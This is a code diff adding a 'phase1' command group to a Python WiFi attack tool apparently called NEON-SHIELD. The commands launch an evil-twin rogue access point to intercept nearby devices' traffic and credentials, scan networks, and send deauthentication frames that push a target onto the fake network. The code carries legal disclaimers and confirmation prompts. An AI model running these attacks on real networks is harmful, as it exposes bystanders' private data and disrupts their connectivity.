@@ -202,10 +202,222 @@ def test(targets, interface):
         sys.exit(1)
 
 
+cli_phase1 = click.Group(name='phase1', help='🚀 PHASE 1: Close-Range WiFi Attacks (Nearby Devices)')
+
+@cli_phase1.command()
+@click.option("--interface", default="wlan0", help="WiFi interface (default: wlan0)")
+@click.option("--ssid", default="Starbucks_WiFi", help="Network name to broadcast")
+@click.option("--channel", default=6, type=int, help="WiFi channel (1-11)")
+@click.option("-y", "--yes", is_flag=True, help="Skip confirmation")
+def ap_mode(interface, ssid, channel, yes):
+    """
+    🔴 Create rogue WiFi access point (Evil Twin).
+
+    Broadcasts a fake WiFi network with the same name as a popular WiFi (e.g., Starbucks_WiFi).
+    Nearby devices auto-connect, exposing all their traffic to NEON-SHIELD.
+
+    ⚠️ EXTREMELY POWERFUL ATTACK: All devices that connect will have their traffic intercepted.
+    """
+    # Disclaimer
+    disclaimer = """
+╔══════════════════════════════════════════════════════════════════════╗
+║           🔴 ROGUE ACCESS POINT — PHASE 1 ATTACK 🔴                 ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  YOU ARE ABOUT TO:                                                   ║
+║  • Create a FAKE WiFi network named: """ + ssid + """
+║  • Intercept ALL traffic from devices that connect                  ║
+║  • Capture PASSWORDS, EMAILS, MESSAGES, PERSONAL DATA               ║
+║  • Demonstrate how cyber attacks work in the real world             ║
+║                                                                      ║
+║  LEGAL DISCLAIMER:                                                   ║
+║  This attack is ILLEGAL without explicit authorization.             ║
+║  Unauthorized WiFi interception is a FEDERAL CRIME                  ║
+║  (up to 10 years imprisonment, $250k+ fines).                       ║
+║                                                                      ║
+║  YOU CONFIRM:                                                        ║
+║  ✓ You own this WiFi network OR have written authorization          ║
+║  ✓ All devices connecting are authorized for testing               ║
+║  ✓ You understand the legal consequences                            ║
+║  ✓ This is for EDUCATION & AUTHORIZED TESTING ONLY                 ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+    console.print(disclaimer, style="bold red")
+
+    if not yes:
+        response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
+        if response != "yes":
+            console.print("[red]Cancelled.[/red]")
+            return
+
+    # Check root
+    if os.geteuid() != 0:
+        console.print("[red]❌ Root required. Retry with: sudo neon-shield phase1 ap-mode[/red]")
+        sys.exit(1)
+
+    # Check requirements
+    from wifi_ap import RogueAccessPoint, check_ap_requirements
+    can_run, msg = check_ap_requirements()
+    if not can_run:
+        console.print(f"[red]❌ {msg}[/red]")
+        sys.exit(1)
+
+    # Start AP
+    try:
+        ap = RogueAccessPoint(interface, ssid, channel)
+        if ap.start():
+            console.print("\n[green bold]✅ ROGUE ACCESS POINT ACTIVE[/green bold]")
+            console.print(f"[cyan]Broadcasting: {ssid}[/cyan]")
+            console.print(f"[cyan]Nearby devices will auto-connect...[/cyan]\n")
+            console.print("[yellow]Press Ctrl+C to stop[/yellow]")
+
+            # Keep running
+            try:
+                import time
+                while True:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                console.print("\n[yellow]Stopping rogue AP...[/yellow]")
+                ap.stop()
+                console.print("[green]✅ Stopped[/green]")
+        else:
+            console.print("[red]❌ Failed to start rogue AP[/red]")
+            sys.exit(1)
+
+    except Exception as e:
+        console.print(f"[red]❌ Error: {e}[/red]")
+        sys.exit(1)
+
+
+@cli_phase1.command()
+@click.option("--interface", default="wlan0", help="WiFi interface (default: wlan0)")
+def scan_networks(interface):
+    """
+    📡 Scan nearby WiFi networks and detect vulnerabilities.
+
+    Shows all networks in range, encryption type, signal strength, and security risks.
+    Identifies which networks are vulnerable to attacks.
+
+    🎓 Educational: Demonstrates what attackers see when scanning WiFi.
+    """
+    disclaimer = """
+⚠️  WiFi NETWORK ENUMERATION & VULNERABILITY SCAN
+
+This will scan nearby networks and show:
+• Network names (SSID), encryption type, signal strength
+• Which networks are vulnerable (WEP, open, weak passwords)
+• Privacy risks (SSID broadcasting reveals location patterns)
+
+📚 EDUCATIONAL: Shows why network security matters.
+   After scanning, you'll see which networks an attacker would target.
+"""
+    console.print(disclaimer, style="yellow")
+
+    # Check root
+    if os.geteuid() != 0:
+        console.print("[red]Root required. Retry with: sudo neon-shield phase1 scan-networks[/red]")
+        sys.exit(1)
+
+    # Check requirements
+    from wifi_scanner import WiFiScanner, check_scanner_requirements
+    can_run, msg = check_scanner_requirements()
+    if not can_run:
+        console.print(f"[red]❌ {msg}[/red]")
+        sys.exit(1)
+
+    try:
+        scanner = WiFiScanner(interface)
+        console.print("[cyan]Scanning for networks...[/cyan]")
+        if scanner.scan(duration=20):
+            scanner.display_results()
+        else:
+            console.print("[red]❌ Scan failed[/red]")
+
+    except Exception as e:
+        console.print(f"[red]❌ Error: {e}[/red]")
+        sys.exit(1)
+
+
+@cli_phase1.command()
+@click.option("--interface", default="wlan0", help="WiFi interface (default: wlan0)")
+@click.option("--target-mac", required=True, help="Target device MAC address (e.g., AA:BB:CC:DD:EE:FF)")
+@click.option("--gateway-mac", required=True, help="Gateway/router MAC address")
+@click.option("--ssid", default="[Unknown]", help="Network name (for logging)")
+@click.option("--count", default=10, type=int, help="Number of deauth frames")
+@click.option("-y", "--yes", is_flag=True, help="Skip confirmation")
+def deauth(interface, target_mac, gateway_mac, ssid, count, yes):
+    """
+    🔴 Send WiFi deauthentication frames to disconnect a device.
+
+    Forces a device to disconnect from its WiFi network.
+    When combined with rogue AP, forces device to reconnect to our fake network.
+
+    ⚠️ DESTRUCTIVE: Disrupts legitimate WiFi connectivity.
+    """
+    disclaimer = f"""
+╔══════════════════════════════════════════════════════════════════════╗
+║         🔴 WIFI DEAUTHENTICATION ATTACK — PHASE 1B 🔴               ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  TARGET DEVICE: {target_mac}
+║  NETWORK: {ssid}
+║  ACTION: Force disconnect (will disrupt user's WiFi)                ║
+║                                                                      ║
+║  ⚠️  LEGAL WARNING:                                                  ║
+║  Deauthentication attacks are ILLEGAL without authorization.        ║
+║  This is a DENIAL-OF-SERVICE attack that disrupts connectivity.    ║
+║  Unauthorized use carries federal penalties.                        ║
+║                                                                      ║
+║  EDUCATIONAL PURPOSE: Shows why WiFi security needs protection      ║
+║  against frame-level attacks (WPA3 has defenses).                   ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+    console.print(disclaimer, style="bold red")
+
+    if not yes:
+        response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
+        if response != "yes":
+            console.print("[red]Cancelled.[/red]")
+            return
+
+    # Check root
+    if os.geteuid() != 0:
+        console.print("[red]Root required. Retry with: sudo neon-shield phase1 deauth ...[/red]")
+        sys.exit(1)
+
+    # Check requirements
+    from wifi_deauth import WiFiDeauthAttacker, check_deauth_requirements
+    can_run, msg = check_deauth_requirements()
+    if not can_run:
+        console.print(f"[red]❌ {msg}[/red]")
+        sys.exit(1)
+
+    try:
+        attacker = WiFiDeauthAttacker(interface)
+        if attacker.deauth_device(target_mac, gateway_mac, ssid, count):
+            console.print("[green bold]✅ Deauthentication attack sent[/green bold]")
+            console.print("[yellow]Device will disconnect and search for networks[/yellow]")
+            console.print("[yellow]If rogue AP is nearby, device may auto-connect to it[/yellow]")
+        else:
+            console.print("[red]❌ Deauth failed[/red]")
+
+    except Exception as e:
+        console.print(f"[red]❌ Error: {e}[/red]")
+        sys.exit(1)
+
+
+cli.add_command(cli_phase1)
+
+
 def main():
     """Entry point."""
-    if os.geteuid() != 0 and len(sys.argv) > 1 and sys.argv[1] in ("start", "stop", "cleanup"):
-        console.print("[red]Error: 'start', 'stop', and 'cleanup' require root privileges.[/red]")
+    # Only require root for commands that actually need it, not for help
+    needs_root_commands = ("start", "stop", "cleanup")
+    if (os.geteuid() != 0 and len(sys.argv) > 1 and
+        sys.argv[1] in needs_root_commands and "--help" not in sys.argv):
+        console.print("[red]Error: This command requires root privileges.[/red]")
         console.print("Retry with: sudo neon-shield " + " ".join(sys.argv[1:]))
         sys.exit(1)
 
